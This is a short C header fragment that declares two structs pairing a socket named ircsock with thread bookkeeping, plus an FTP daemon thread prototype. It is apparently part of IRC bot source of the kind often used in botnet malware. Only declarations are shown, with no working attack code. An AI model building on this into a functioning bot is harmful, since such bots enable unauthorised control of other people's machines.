typedef struct FTP {
	SOCKET ircsock;
	int ThreadNum;
	BOOL GotInfo;
}FTP;

typedef struct FTPT {
	SOCKET consock;
	SOCKET ircsock;
	int ThreadNum;
	BOOL GotInfo;
}FTPT;

DWORD WINAPI FTPD(LPVOID param);
